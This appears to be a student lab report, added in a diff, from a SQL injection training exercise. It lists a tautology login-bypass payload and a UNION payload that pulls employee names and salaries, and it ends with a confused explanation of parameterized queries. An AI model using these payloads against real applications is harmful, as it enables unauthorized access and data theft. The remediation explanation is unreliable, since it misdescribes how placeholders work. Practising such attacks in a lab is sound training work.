@@ -1,0 +1,18 @@
+==================================================
+SESSION 25: SQL INJECTION EXFILTRATION REPORT
+==================================================
+
+1. AUTHENTICATION BYPASS
+* Tautology Payload Used: [' OR 1=1 --]
+
+2. DATABASE MAPPING (UNION ATTACK)
+* Number of Columns Discovered: [2]
+* Table Name Discovered: [Alice (CEO)-Executive, Bob-Engineering]
+
+3. DATA EXFILTRATION
+* CEO Salary Extracted: [$2,500,000]
+* Final UNION Payload Used: [' UNION SELECT name, salary FROM employees --]
+
+4. REMEDIATION
+* What is the primary defense against this attack?
+Answer: [To stop a SQL injection we need to use Parameterized Queries (Prepared Statements).Parameterized comes to action when the attacker hits enter and then the code behind the hit button(python)send a message to database to check if the input is correct if not then placeholrders come into action. Placeholder just contained the attacker there and whatever they type stay there for data to check if database if the input match any of the data that inside the records if not then it will just return nothing.]
